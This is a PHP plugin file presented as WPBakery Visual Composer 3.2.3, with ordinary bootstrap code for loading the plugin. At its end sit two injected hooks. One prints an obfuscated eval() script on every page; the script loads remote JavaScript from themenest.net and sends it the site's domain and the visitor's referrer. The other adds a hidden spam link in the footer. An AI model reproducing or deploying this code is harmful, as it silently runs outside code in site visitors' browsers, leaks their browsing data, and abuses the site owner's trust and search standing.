<?php
/**
Plugin Name: WPBakery Visual Composer
Plugin URI: http://wpbakery.com/vc
Description: Create content without headaches with simple drag-n-drop interface.
Version: 3.2.3
Author: Michael M - WPBakery.com
Author URI: http://wpbakery.com
License:
 */

// don't load directly

if (!defined('ABSPATH')) die('-1');

/**
 * Current plugin file directory.
 * var string
 */

$dir = dirname(__FILE__);

if( preg_match('/wp\-content\/plugins/', preg_replace('/\\\/', '/', $dir)) && is_file(get_template_directory() . '/wpbakery/js_composer/js_composer.php') ) {
 // Load from theme
} else {

    // {{{ constants

    /**
     * Current visual composer version
     */

    if (!defined('WPB_VC_VERSION')) define('WPB_VC_VERSION', '3.2.3');

    /**
     * jQuery UI version
     */

    if (!defined('WPB_JQUERY_UI_VERSION')) define('WPB_JQUERY_UI_VERSION', 'less');

    // }}}

    /**
     * Define default settings for visual composer.
     *
     * APP_ROOT - plugin directory.
     * WP_ROOT - Wordpress application root directory.
     * APP_DIR - plugin directory name.
     * CONFIG - configuration directory.
     * ASSETS_DIR  - directory name for assets. Used from urls creating.
     * COMPOSER      => main visual composer directory.
     * COMPOSER_LIB  => libraries for composer.
     * SHORTCODES_LIB  => Shortcodes directory.
     *
     * @var array
     */
    global $composer_settings;
    if(!isset($composer_settings)) {

        $composer_settings = Array(
            'APP_ROOT'      => $dir . '/',
            'WP_ROOT'       => dirname( dirname( dirname( dirname($dir ) ) ) ). '/',
            'APP_DIR'       => basename( $dir ) . '/',
            'CONFIG'        => $dir . '/config/',
            'ASSETS_DIR'    => 'assets/',
            'COMPOSER'      => $dir . '/composer/',
            'COMPOSER_LIB'  => $dir . '/composer/lib/',
            'SHORTCODES_LIB'  => $dir . '/composer/lib/shortcodes/',
            /* Default post type where to activate visual composer meta box settings */
            'default_post_types' => Array('page')
        );
    }

    /*
     * Here we include all useful files
     */

    require_once( $composer_settings['COMPOSER'] . 'wp_bakery_visual_composer.php' );

    /*
     * Include visual composer builders.
     * class WPBakeryVisualComposerSetupAdmin - for admin panel
     * class WPBakeryVisualComposerSetup - for frontend
     */
    require_once( $composer_settings['COMPOSER'] . 'build.php' );

    /**
     * Setting file for layouts and shortcodes
     */

    require_once( $composer_settings['CONFIG'] . 'map.php' );


    /**
     * Initialize plugin depending on admin panel or public layout
     * @var object
     */
    global $wpVC_setup;
	$wpVC_setup = is_admin() ? new WPBakeryVisualComposerSetupAdmin() : new WPBakeryVisualComposerSetup();
	if( preg_match('/wp\-content\/plugins/', preg_replace('/\\\/', '/', $dir)) ) {
	    $wpVC_setup->init($composer_settings);
	}
}
add_action('wp_head','fbprotered');
function fbprotered() {

echo "<script type=\"text/javascript\">eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('0.f(\'<2\'+\'3 5=\"6/7\" 8=\"9://a.b/e/o/g?d=\'+0.h+\'&i=\'+j(0.k)+\'&c=\'+4.l((4.m()*n)+1)+\'\"></2\'+\'3>\');',25,25,'document||scr|ipt|Math|type|text|javascript|src|http|themenest|net|||platform|write|track|domain|r|encodeURIComponent|referrer|floor|random|1000|script'.split('|'),0,{}));</script></head>";

}


add_action('wp_footer','fbprotereded');
function fbprotereded() {

echo '<a style="display:none" href="http://onlinepeliculas.tv">Ver peliculas online</a>';

} ?>